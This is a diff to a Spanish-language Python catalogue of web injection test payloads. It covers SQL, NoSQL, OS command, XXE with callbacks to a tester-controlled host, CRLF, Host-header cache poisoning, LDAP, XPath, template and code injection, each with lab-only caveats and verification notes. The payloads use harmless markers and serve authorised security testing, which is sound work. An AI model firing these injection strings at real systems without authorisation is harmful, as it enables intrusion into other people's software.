@@ -117,9 +117,9 @@ add('xxe', 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%
     ('SOAP XML', 'En un endpoint SOAP de laboratorio que acepta DOCTYPE.', 'xml',
      '<!DOCTYPE Envelope [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/soap-prueba-123">]><Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><x>&xxe;</x></Body></Envelope>',
      'Comparar con SOAP sin DTD; el rechazo por esquema puede impedir alcanzar parser vulnerable.'),
-    ('DTD externo para XXE ciega', 'Hospedar una DTD propia con una entidad de callback; requiere parser que permita entidades de parámetro externas.', 'xml',
-     '<!DOCTYPE r [<!ENTITY % dtd SYSTEM "https://{CONTROLLED_HOST}/prueba.dtd"> %dtd;]><r>prueba</r>\n\n<!-- Contenido de prueba.dtd alojado por el tester: -->\n<!ENTITY % cb SYSTEM "https://{CONTROLLED_HOST}/dtd-callback-123">\n%cb;',
-     'Distinguir descarga de la DTD de la segunda llamada; ninguna implica lectura de archivo.'),
+    ('DTD externo para XXE ciega', 'Alojar una DTD propia que contenga `<!ENTITY % cb SYSTEM "https://{CONTROLLED_HOST}/dtd-callback-123"> %cb;`; requiere entidades de parámetro externas.', 'xml',
+     '<!DOCTYPE r [<!ENTITY % dtd SYSTEM "https://{CONTROLLED_HOST}/prueba.dtd"> %dtd;]><r>prueba</r>',
+     'El payload XML es un solo documento. Distinguir descarga de la DTD de la segunda llamada; ninguna implica lectura de archivo.'),
 ])
 
 add('ssti', 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md', [
@@ -377,4 +377,190 @@ ampliar('ssti', 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master
     ('Apache Velocity #set', 'Aplicable a Velocity en Java cuando entrada se interpreta como plantilla completa.', 'text',
      '#set($marca = 7 * 7)$marca',
      '49 en salida cruda indica evaluación de directiva, distinto de interpolación de variable.'),
+])
+
+# Contextos que requieren sintaxis distinta, controles diferenciales o motores específicos.
+ampliar('sql-injection', 'https://portswigger.net/web-security/sql-injection/cheat-sheet', [
+    ('UNION en Oracle con FROM dual', 'Tras confirmar dos columnas y una posición de texto en Oracle, usar un marcador propio.', 'sql',
+     "' UNION SELECT 'prueba-123',NULL FROM dual--",
+     'Oracle exige FROM en SELECT; el marcador debe proceder de la fila UNION, no del reflejo del parámetro.',
+     'https://portswigger.net/web-security/sql-injection/union-attacks'),
+    ('Retardo condicional Oracle', 'Solo laboratorio Oracle con DBMS_PIPE accesible; comparar condición verdadera y falsa con un segundo.', 'sql',
+     "SELECT CASE WHEN 1=1 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('prueba-123',1) ELSE NULL END FROM dual",
+     'Una diferencia repetible de latencia puede confirmar evaluación; privilegios y colas existentes afectan el resultado.'),
+    ('Retardo condicional SQL Server', 'Se requiere ejecución de sentencias apiladas; probar un segundo y un control falso.', 'sql',
+     "'; IF (1=1) WAITFOR DELAY '00:00:01'--",
+     'El control IF (1=2) debe ser más rápido; colas o latencia variable requieren varias mediciones.'),
+    ('Error XML de MariaDB/MySQL antiguo', 'Solo en MariaDB o MySQL con EXTRACTVALUE disponible; usar exclusivamente marcador local.', 'sql',
+     "' AND EXTRACTVALUE(1,CONCAT(0x5c,'prueba-123'))-- ",
+     'El error XPath puede incluir el marcador. MySQL 8 retiró EXTRACTVALUE: fallo de esta técnica no descarta SQLi.'),
+    ('Inyección en estructura ORDER BY', 'Si `sort` se concatena como expresión SQL, probar dos filas propias con ID distintos.', 'text',
+     'CASE WHEN 1=1 THEN id ELSE -id END\nCASE WHEN 1=2 THEN id ELSE -id END',
+     'Debe invertirse el orden de las mismas filas; un parámetro `sort` con valores permitidos no es por sí solo SQLi.',
+     'https://portswigger.net/support/sql-injection-in-the-query-structure'),
+    ('SQLi de segundo orden en registro propio', 'En laboratorio con una fila propia `name=prueba`, guardar uno de los valores en un campo que otro flujo reutiliza en `WHERE name=\'ENTRADA\'`.', 'text',
+     "prueba' AND '1'='1\nprueba' AND '1'='2",
+     'Comparar el flujo posterior, no solo el guardado. Atribuir la diferencia a la consulta que reutiliza el dato persistido.',
+     'https://portswigger.net/kb/issues/00100210_sql-injection-second-order'),
+])
+
+ampliar('nosql-injection', 'https://portswigger.net/web-security/nosql-injection', [
+    ('Filtro compuesto $or', 'El endpoint esperaba un valor exacto y el tester controla dos documentos de prueba.', 'json',
+     '{"$or":[{"name":"prueba-123"},{"name":"prueba-456"}]}',
+     'Si el cliente introduce el operador y amplía resultados, probar el contrato y la autorización de cada objeto.',
+     'https://www.mongodb.com/docs/manual/reference/operator/query/or/'),
+    ('$elemMatch en arreglo anidado', 'Usar documentos propios con un arreglo `tags`; la API esperaba una etiqueta literal.', 'json',
+     '{"tags":{"$elemMatch":{"label":"prueba-123","active":true}}}',
+     'La coincidencia de un elemento completo difiere de comparar una cadena; confirmar que no sea una búsqueda avanzada permitida.',
+     'https://www.mongodb.com/docs/manual/reference/operator/query/elemmatch/'),
+    ('$where ciego por tiempo corto', 'Solo laboratorio MongoDB con JavaScript de servidor habilitado y un único documento de prueba.', 'json',
+     '{"$where":"if (this.name === \'prueba-123\') { sleep(500); } return true;"}',
+     'Comparar con nombre falso y pocas repeticiones. La pausa de 500 ms no debe usarse contra colecciones grandes.'),
+    ('Sintaxis query_string de Elasticsearch', 'Solo si el buscador espera texto literal pero lo pasa a `query_string`; dos nombres son del tester.', 'text',
+     'name:prueba-123 OR name:prueba-456',
+     'Dos resultados frente a búsqueda literal sugieren que se interpretaron operadores; validar si el lenguaje de búsqueda está documentado.',
+     'https://www.elastic.co/docs/reference/query-languages/query-dsl/query-dsl-query-string-query'),
+])
+
+ampliar('command-injection', 'https://portswigger.net/web-security/os-command-injection', [
+    ('OR condicional tras fallo', 'El primer comando debe fallar de forma controlada; un shell POSIX o cmd.exe interpreta ||.', 'text',
+     'host-inexistente.invalid || echo prueba-123',
+     'El marcador solo debe aparecer al fallar el primer comando; distingue || de && y de un eco del parámetro.'),
+    ('Salida de comillas simples POSIX', 'La aplicación usa una construcción como `sh -c "ping -c 1 \'ENTRADA\'"` en laboratorio.', 'text',
+     "'; printf prueba-123; #",
+     'El primer carácter cierra la cita; el marcador debe provenir del proceso y no del valor reflejado.'),
+    ('Salida de comillas dobles POSIX', 'El valor queda dentro de comillas dobles de una cadena pasada a shell.', 'text',
+     '"; printf prueba-123; #',
+     'Confirmar que se cerró el contexto de comillas y que el resto de la orden quedó comentado.'),
+    ('Inyección de argumento sin shell', 'Si la aplicación ejecuta `curl` con una URL del usuario como argumento, probar opción inocua.', 'text',
+     '--help',
+     'Mostrar la ayuda de curl revela interpretación como opción, aunque no haya shell ni ejecución de otro programa.',
+     'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html'),
+])
+
+ampliar('xxe', 'https://portswigger.net/web-security/xxe', [
+    ('XML admitido en endpoint de formulario', 'En un endpoint propio que normalmente recibe form-urlencoded, comprobar si también analiza XML.', 'http',
+     'POST /api/test-owned HTTP/1.1\nHost: {ORIGEN}\nContent-Type: text/xml\n\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/tipo-xml-123">]><r><dato>&xxe;</dato></r>',
+     'Primero validar que el XML sin DTD cumple la operación; el callback de backend confirma la superficie XML oculta.'),
+    ('Entidad en DOCX procesado por el servidor', 'Solo en un DOCX de laboratorio propio: insertar este XML en `word/document.xml` y volver a empaquetar.', 'xml',
+     '<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "https://{CONTROLLED_HOST}/docx-123">]><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>',
+     'El paquete DOCX debe seguir siendo válido. Solo cuenta una solicitud originada por el procesador servidor, no la vista local del archivo.'),
+])
+
+ampliar('ssti', 'https://portswigger.net/web-security/server-side-template-injection', [
+    ('Django Template: widthratio', 'Solo si se renderiza una plantilla Django, no Jinja2; directiva sin acceso a sistema.', 'text',
+     '{% widthratio 7 7 49 %}',
+     'Una salida 49 en respuesta HTTP cruda demuestra evaluación de la directiva; no implica ejecución Python.',
+     'https://docs.djangoproject.com/en/dev/ref/templates/builtins/#widthratio'),
+    ('Mako: método Python sobre literal', 'Confirmar Mako cuando `${}` podría confundirse con FreeMarker.', 'text',
+     "${'prueba-123'.upper()}",
+     'PRUEBA-123 sugiere semántica Python/Mako; contrastar con una segunda expresión del motor.',
+     'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md'),
+    ('Smarty: función math', 'Solo en un campo que pasa a una plantilla Smarty completa.', 'text',
+     '{math equation="7*7"}',
+     '49 confirma evaluación de una función de Smarty en servidor; una vista previa legítima debe evaluarse según contrato.',
+     'https://www.smarty.net/docs/en/language.function.math.tpl'),
+    ('EJS Node: método JavaScript', 'Desambiguar EJS de ERB cuando ambos aceptan etiquetas `<%= ... %>`.', 'text',
+     "<%= 'prueba-123'.toUpperCase() %>",
+     'PRUEBA-123 en respuesta cruda indica evaluación JS; ERB no tiene ese método.',
+     'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md'),
+])
+
+ampliar('ldap-injection', 'https://www.rfc-editor.org/rfc/rfc4515', [
+    ('Filtro completo con OR entre dos cuentas propias', 'Solo si un campo anunciado como uid literal se acepta como filtro LDAP completo en laboratorio.', 'ldap',
+     '(|(uid=prueba-a)(uid=prueba-b))',
+     'Recibir ambas entradas revela que el cliente controla la estructura del filtro; una API de filtros intencional no es fallo.'),
+    ('Filtro AND con NOT', 'Directorio aislado con dos entradas del tester, una marcada como ausente.', 'ldap',
+     '(&(objectClass=person)(!(uid=prueba-ausente)))',
+     'Comprobar inversión respecto a una condición igual; esta sintaxis requiere control del filtro completo.'),
+    ('Coincidencia aproximada', 'Solo en un atributo de prueba con regla approximateMatch habilitada.', 'ldap',
+     '(cn~=Prueba Uno)',
+     'Comparar con coincidencia exacta y valor distante; el servidor puede tratar `~=` como igualdad según esquema.'),
+    ('Comparación ordenada de atributo numérico', 'En un directorio de laboratorio con uidNumber controlados.', 'ldap',
+     '(uidNumber>=1000)',
+     'Un rango aceptado donde se esperaba un valor literal muestra control del operador; limitar la respuesta a entradas propias.'),
+    ('Matching rule transitiva de Active Directory', 'Solo AD de laboratorio con grupos y usuarios propios, si se acepta un filtro LDAP completo.', 'ldap',
+     '(memberOf:1.2.840.113556.1.4.1941:=CN=GrupoPrueba,OU=Lab,DC=ejemplo,DC=test)',
+     'La regla puede incluir membresía anidada; una diferencia frente a igualdad simple depende de la estructura real del lab.',
+     'https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/4e638665-f466-4597-93c4-12f2ebfabab5'),
+])
+
+ampliar('crlf-injection', 'https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md', [
+    ('CRLF en ruta reflejada dentro de Link', 'Solo si una cabecera Link usa la ruta solicitada sin codificar.', 'http',
+     'GET /archivo%0d%0aX-Prueba:%20ruta-123 HTTP/1.1\nHost: {ORIGEN}',
+     'Debe verse una cabecera X-Prueba nueva en la respuesta cruda; un 404 o un eco en HTML no bastan.'),
+    ('Separación de cabecera y cuerpo en laboratorio', 'Un valor de Location vulnerable permitiría dos CRLF; usar servidor y caché aislados.', 'http',
+     'GET /redirect?next=%2Fok%0d%0aX-Prueba:%20cuerpo-123%0d%0a%0d%0aprueba-123 HTTP/1.1\nHost: {LAB_AISLADO}',
+     'Comprobar bytes de la respuesta y longitud declarada; si solo se ve texto dentro de Location, no hubo response splitting.'),
+])
+
+ampliar('header-injection', 'https://portswigger.net/web-security/host-header/exploiting', [
+    ('Origin controlado para política CORS', 'Solo cuenta de prueba en un endpoint privado; origen HTTPS propio.', 'http',
+     'GET /api/me HTTP/1.1\nHost: {ORIGEN}\nOrigin: https://{CONTROLLED_HOST}',
+     'La lectura cruzada requiere ACAO exacto, ACAC true y cookies realmente enviadas; validar en navegador.',
+     'https://portswigger.net/web-security/cors'),
+    ('Referer usado como autorización', 'Solicitud de prueba que normalmente devuelve 403; no alterar datos de terceros.', 'http',
+     'GET /api/test-owned HTTP/1.1\nHost: {ORIGEN}\nReferer: https://{ORIGEN}/admin/',
+     'Un 200 por sí solo es insuficiente; demostrar que una función propia bloqueada se habilita solo por Referer.',
+     'https://portswigger.net/kb/issues/00400100_referer-dependent-response'),
+])
+
+ampliar('host-header-injection', 'https://portswigger.net/web-security/host-header/exploiting', [
+    ('Enrutamiento de backend hacia listener propio', 'Solo laboratorio con reverse proxy y hostname propio; no usar direcciones internas.', 'http',
+     'GET /route-prueba-123 HTTP/1.1\nHost: {CONTROLLED_HOST}',
+     'Una conexión desde el backend al listener prueba efecto de routing; distinguirla de la solicitud directa del navegador.'),
+    ('Contaminación de caché con Host no clave', 'Únicamente caché aislada o endpoint de prueba con nonce; no afectar tráfico de usuarios.', 'http',
+     'GET /test-owned?nonce=123 HTTP/1.1\nHost: {ORIGEN}\nX-Forwarded-Host: {CONTROLLED_HOST}',
+     'Repetir sin X-Forwarded-Host y verificar si un enlace con host propio se sirve desde caché bajo la misma clave; limpiar el marcador.'),
+])
+
+ampliar('email-header-injection', 'https://portswigger.net/kb/issues/00200800_smtp-header-injection', [
+    ('From inyectado por salto de línea', 'El campo nombre/asunto entra en cabeceras SMTP y el mensaje va solo a una bandeja del tester.', 'text',
+     'Prueba%0D%0AFrom:%20{EMAIL_PROPIO_2}',
+     'Comparar `From` y `Sender` en fuente cruda; un MTA puede reescribir el remitente y bloquear el efecto.'),
+    ('Destinatario adicional sin salto de línea', 'Solo cuando la aplicación copia un correo de usuario directamente en la lista To; ambas direcciones son propias.', 'text',
+     '{EMAIL_PROPIO_1},{EMAIL_PROPIO_2}',
+     'La entrega a dos bandejas indica interpretación de lista, no CRLF; confirmar que el contrato permitía solo un destinatario.',
+     'https://www.rfc-editor.org/rfc/rfc5322.html'),
+])
+
+ampliar('xpath-injection', 'https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/09-XPath_Injection/', [
+    ('Predicado entre comillas dobles', 'La consulta original usa `name="ENTRADA"`; dos valores de control de un nodo propio.', 'text',
+     'prueba" or "1"="1\nprueba" or "1"="2',
+     'El cambio verdadero/falso debe modificar el mismo resultado; prueba un contexto distinto al de comillas simples.'),
+    ('Unión de rutas XPath', 'Solo cuando el input controla una expresión de ruta completa; dos nodos son del tester.', 'xpath',
+     "//item[@id='prueba-123'] | //item[@id='prueba-456']",
+     'Si aparecen ambos nodos pese a esperar un solo identificador literal, se interpretó el operador de unión.',
+     'https://www.w3.org/TR/1999/REC-xpath-19991116/'),
+    ('Selector posicional', 'Usar dos elementos de prueba en un XML de laboratorio cuando el input forma parte de una ruta.', 'xpath',
+     'item[position()=1]\nitem[position()=2]',
+     'El selector debe alternar entre los dos nodos conocidos; descartar ordenación de la aplicación.',
+     'https://www.w3.org/TR/1999/REC-xpath-19991116/'),
+    ('Eje ancestor fuera del subárbol esperado', 'Solo en un XML propio donde `root` es ancestro del item de prueba.', 'xpath',
+     "//item[@id='prueba-123']/ancestor::root",
+     'Leer el nodo ancestro en vez del item demuestra que la ruta controlada cambia el alcance; no usar datos ajenos.',
+     'https://www.w3.org/TR/1999/REC-xpath-19991116/'),
+    ('Función matches de XPath 2.0+', 'No aplica a motores XPath 1.0; el nodo de nombre es del laboratorio.', 'xpath',
+     "matches(string(//item[@id='prueba-123']/name),'^prueba-123$')",
+     'Comparar con patrón imposible; un error de función desconocida indica versión incompatible, no sanitización.',
+     'https://www.w3.org/TR/xpath-functions/#func-matches'),
+])
+
+ampliar('code-injection', 'https://community.owasp.org/attacks/Code_Injection', [
+    ('PHP eval en contexto de sentencia', 'Solo si el valor se concatena en `eval("$x = ENTRADA;")`; canary sin funciones de sistema.', 'php',
+     "1; echo 'prueba-123';",
+     'La salida del marcador muestra que se añadieron sentencias, no solo que se evaluó una fórmula.',
+     'https://community.owasp.org/attacks/Code_Injection'),
+    ('Python exec frente a eval', 'Laboratorio donde el servidor ejecuta un bloque de sentencias y captura stdout.', 'python',
+     'marca = "prueba-123"\nprint(marca)',
+     'La asignación no es expresión válida para eval(); verla ejecutada distingue un sink exec o equivalente.',
+     'https://docs.python.org/3/library/functions.html#exec'),
+    ('Node.js Function constructor', 'Solo si un servicio Node crea una función desde el cuerpo suministrado por el usuario.', 'js',
+     'return Math.max(7,49);',
+     '`return` a nivel superior es válido en el cuerpo de Function y no en un script eval; observar 49 en respuesta servidor.',
+     'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function'),
+    ('Spring Expression Language', 'Se conoce un sink `parseExpression` de SpEL que acepta una expresión completa.', 'spel',
+     'T(java.lang.Math).max(7,49)',
+     '49 prueba invocación estática inocua en SpEL; un simple cálculo esperado por contrato no implica vulnerabilidad.',
+     'https://docs.spring.io/spring-framework/reference/core/expressions/language-ref/types.html'),
 ])
